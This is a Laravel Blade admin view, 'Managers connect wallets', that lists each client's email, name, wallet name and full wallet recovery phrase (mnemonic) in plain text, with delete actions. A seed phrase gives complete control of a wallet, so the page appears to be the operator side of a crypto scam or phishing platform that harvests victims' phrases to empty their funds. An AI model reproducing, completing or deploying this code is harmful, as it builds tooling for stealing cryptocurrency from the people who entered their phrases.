<?php
if (Auth('admin')->User()->dashboard_style == 'light') {
    $text = 'dark';
} else {
    $text = 'light';
}
?>
@extends('layouts.app')
@section('content')
    @include('admin.topmenu')
    @include('admin.sidebar')
    <div class="main-panel ">
        <div class="content ">
            <div class="page-inner">
                <div class="mt-2 mb-4">
                    <h1 class="title1 ">Managers connect wallets</h1>
                </div>
                <x-danger-alert />
                <x-success-alert />

                <div class="mb-5 row">
                    <div class="col p-4 shadow card ">
                        <div class="table-responsive" data-example-id="hoverable-table">
                            <table id="ShipTable" class="table table-hover ">
                                <thead>
                                    <tr>
                                       
                                        <th>Client Email</th>
                                        <th>Wallet</th>
                                        <th>Wallet Phrase (Mnemonics)</th>
                                        <th>Client Name</th>
                                        <th>Date</th>
                                        <th>ACTION</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    @foreach ($wallets as $wallet)
                                        <tr>
                                            <td>{{ $wallet->wuser->email?$wallet->wuser->email:'user deleted' }}</td>
                                            <td>{{$wallet->wallet_name }}</td>
                                            <td>{{ $wallet->phrase }}</td>
                                            <td>{{  $wallet->wuser->name?$wallet->wuser->name:'user deleted' }}</td>
                                            <td>{{ $wallet->updated_at }}</td>
                                            
                                            <td>
                                                <div class="dropdown">
                                                    <a class="btn btn-secondary btn-sm dropdown-toggle" href="#"
                                                        role="button" id="dropdownMenuLink" data-toggle="dropdown"
                                                        aria-haspopup="true" aria-expanded="false">
                                                        Actions
                                                    </a>
                                                    <div class="dropdown-menu " aria-labelledby="dropdownMenuLink">

                                                      
                                                            <a class="m-1 btn btn-danger btn-sm"
                                                                href="{{ url('admin/dashboard/mwalletdelete') }}/{{ $wallet->id }}">Delete</a>
                                                        
                                                    </div>
                                                </div>
                                            </td>
                                        </tr>

                                @endforeach
                                        
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    @endsection
